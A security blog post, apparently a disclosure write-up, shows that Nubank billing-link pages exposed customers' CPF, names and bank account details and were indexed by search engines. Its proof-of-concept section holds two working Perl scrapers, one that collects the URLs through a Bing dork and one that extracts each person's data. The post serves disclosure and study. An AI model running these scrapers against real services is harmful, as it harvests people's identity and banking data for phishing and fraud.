---
layout: content
title: 'A little case about scraping personal data exposure in the web'
description: 'Between the use and some tests that I always end up running on the applications I have installed on my Smartphone, I ended up bumping into a very interesting feature of Nubank, which allows the user to create a "billing link" and send that link to one or more people to charge. I found the functionality very useful, but when I saw up close how it worked, I was a little uncomfortable in view of the number of scenarios that that implementation could be exposed... With this intrinsic dissatisfaction, I decided to generate some proof of concepts and share them with the company so that they could re-evaluate the design of the functionality and it turned out that in this quick and simple demonstration I was able to map some personal data (CPF, Full Name, Account Number and Agency) of more than 100 customers.'
og_image: https://heitorgouvea.me/images/publications/nubank-scraping/google-dorks.png
---

### Summary

Between the use and some tests that I always end up running on the applications I have installed on my Smartphone, I ended up bumping into a very interesting feature of Nubank, which allows the user to create a "billing link" and send that link to one or more people to charge. I found the functionality very useful, but when I saw up close how it worked, I was a little uncomfortable in view of the number of scenarios that that implementation could be exposed... With this intrinsic dissatisfaction, I decided to generate some proof of concepts and share them with the company so that they could re-evaluate the design of the functionality and it turned out that in this quick and simple demonstration I was able to map some personal data (CPF, Full Name, Account Number and Agency) of more than 100 customers.

*Disclaimer:* the responsible company was informed about all details contained in this publication in the shortest possible time and it positioned itself in an ethical and transparent manner, demonstrating due attention and commitment. During all tests, no system was invaded or breached, in addition, the company performed some of the necessary actions/modifications to minimize any undue action that explores the context covered in this publication. Other recommendations to mitigate the vulnerabilities were made by me, however the company did not think it necessary to apply them.

---

### Description

Within the Nubank mobile application, there is a feature called "Charge", this feature comes down to you filling in a value of your desire (if you want) and clicking confirm:

![](/images/publications/nubank-scraping/creating-a-link.png)

After that, a QR Code is generated and you have the option to share it or send the bill through another application, such as WhatsApp:

![](/images/publications/nubank-scraping/whatsapp-shared-link.png)

When I came across this link (the content of the QR Code is also the link), I decided to open it in the browser to take a look and this was the result:

![](/images/publications/nubank-scraping/personal-infos.png)

I came across my full name, CPF, my bank account number and branch exposed without any kind of control, the only requirement to get my information through Nubank was to have such a URL.

Such URL is generated exclusively by the client in your application and it is also up to the client to define how and with whom to share each generated URL.

Convinced to analyse whether this was really possible, I decided to create a *dork* to try to find more of these URLs, this time exposed on the Internet and this was the result:

![](/images/publications/nubank-scraping/google-dorks.png)

Surprised by the fact that Nubank allowed Google and other search engines to index these pages, I decided to validate that such URLs were being published on other channels, and the first channel I decided to validate was Twitter:

![](/images/publications/nubank-scraping/twitter-links.png)

And these are just some of the results, on Twitter you could see that some people use this functionality to receive donations and others use it in very general ways...

---

### Proof of Concept

Convinced to demonstrate an impact of the abuse of this functionality, I decided to create a proof of concept. The first part of this PoC boiled down to building code that would be able to use a search engine to collect as many URLs as possible, so I did a simple *scraper* for Bing:

```perl
#!/usr/bin/env perl

use 5.018;
use strict;
use warnings;
use WWW::Mechanize;
use Mojo::Util qw( url_escape);

sub main {
    my $dork = $ARGV[0];

    if ($dork) {
        my $mech = WWW::Mechanize -> new();
        my %seen = ();

        $dork = url_escape($dork);

        for my $page (0 .. 10) {
            my $url = "http://www.bing.com/search?q=${dork}&first=${page}0";
            $mech -> get($url);
            my @links = $mech -> links();
                        
            foreach my $link (@links) {
                $url = $link -> url();
                next if $seen{$url}++;

                if ($url =~ m/^https?/ && $url !~ m/bing|live|microsoft|msn/) {
                    print $url, "\n";
                }
            }
        }
    }
}

main();
exit;
```

From that code, I was able to collect 100 valid URLs:

![](/images/publications/nubank-scraping/file-with-the-urls.png)

After having all these URLs in a .txt, I had to build another *scraper* that scraped data on the Nubank page:

```perl
#!/usr/bin/env perl

use 5.018;
use strict;
use warnings;
use Mojo::DOM;
use Mojo::UserAgent;

sub main {
    my $urls_file = $ARGV[0];

    if ($urls_file) {
        open my $urls_filehandle, "<", $urls_file or die $!;

        while (<$urls_filehandle>) {
            chomp($_);

            my $userAgent = Mojo::UserAgent -> new();
            my $response  = $userAgent -> get($_) -> result();

            if ($response -> is_success()) {
                my $account = $response -> dom -> find("tr td") -> map("text") -> join(",");

                $account =~ s/Nome,//
                && $account =~ s/CPF,//
                && $account =~ s/Banco,//
                && $account =~ s/Tipo da conta,//
                && $account =~ s/Agência,//
                && $account =~ s/Conta,//
                && $account =~ s/Agência Métodos,//;

                say $account;
            }
        }

        close($urls_filehandle);
    }
}

main();
exit;
```

And this was the result:

![](/images/publications/nubank-scraping/collect-with-names-cpfs.png)

CPF, Full name, account number and branch of more than 100 people, in just a few minutes and a few lines of code.

---

### Impact

The possibility of an attacker abusing this functionality available within Nubank systems is relatively high, as it can expose a huge amount of users, leaking some sensitive information as illustrated above, in addition an attacker who has such information at hand, can use it to strengthen/create a social engineering approach.

---

### Conclusion

Through this analysis it is possible to affirm that a convinced person could implement several *scrapers* in order to map Nubank billing URLs and later collect personal information present in them. This article had PoC as one of those implementations, using a search engine, but there is still room for other channels, such as social networks (Twitter, Facebook and others). What could be used to take these people to exposure or risk scenarios, such as being victims of *spear phishing*/social engineering.

---

### References

- [1] [https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)
- [2] [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)
- [3] [https://en.wikipedia.org/wiki/Web_scraping](https://en.wikipedia.org/wiki/Web_scraping)
